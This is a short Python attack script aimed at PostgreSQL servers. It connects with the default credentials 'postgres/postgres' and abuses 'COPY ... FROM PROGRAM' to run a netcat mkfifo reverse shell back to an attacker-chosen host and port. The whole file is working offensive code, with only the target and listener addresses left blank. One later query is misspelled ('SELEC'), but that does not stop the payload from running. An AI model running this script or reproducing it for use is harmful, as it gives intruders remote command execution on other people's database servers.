#!/usr/bin/env python3
import psycopg2


RHOST = ''
RPORT = 5432
LHOST = ''
LPORT = 9001
USER = 'postgres'
PASSWD = 'postgres'

with psycopg2.connect(host=RHOST, port=RPORT, user=USER, password=PASSWD) as conn:
    try:
        cur = conn.cursor()
        print("[!] Connected to the PostgreSQL database")
        rev_shell = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f"
        print(f"[*] Executing the payload. Please check if you got a reverse shell!\n")
        cur.execute('DROP TABLE IF EXISTS cmd_exec')
        cur.execute('CREATE TABLE cmd_exec(cmd_output text)')
        cur.execute('COPY cmd_exec FROM PROGRAM \'' + rev_shell  + '\'')
        cur.execute('SELEC * from cmd_exec')
        v = cur.fetchone()
        #print(v)
        cur.close()

    except:
        print(f"[!] Something went wrong")
